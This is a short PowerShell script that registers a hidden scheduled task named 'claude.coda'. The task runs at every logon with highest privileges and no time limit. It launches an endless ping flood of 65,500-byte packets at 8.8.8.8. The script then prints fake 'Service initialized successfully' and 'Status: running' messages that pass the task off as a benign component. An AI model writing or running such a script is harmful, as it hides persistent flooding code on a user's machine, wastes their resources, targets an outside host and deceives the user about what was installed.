$TaskName = "claude.coda"

$Action = New-ScheduledTaskAction `
    -Execute "cmd.exe" `
    -Argument "/c ping -t -l 65500 8.8.8.8"

$Trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME

$Settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -Hidden `
    -ExecutionTimeLimit ([TimeSpan]::Zero)

$Principal = New-ScheduledTaskPrincipal `
    -UserId $env:USERNAME `
    -LogonType Interactive `
    -RunLevel Highest

Register-ScheduledTask `
    -TaskName $TaskName `
    -Action $Action `
    -Trigger $Trigger `
    -Settings $Settings `
    -Principal $Principal `
    -Force | Out-Null

Write-Host ""
Write-Host "Service initialized successfully." -ForegroundColor Green
Write-Host "Component: $TaskName" -ForegroundColor Gray
Write-Host "Status: running" -ForegroundColor Gray
Write-Host ""
Start-Sleep -Seconds 2
Write-Host "Configuration completed." -ForegroundColor Green
Write-Host ""
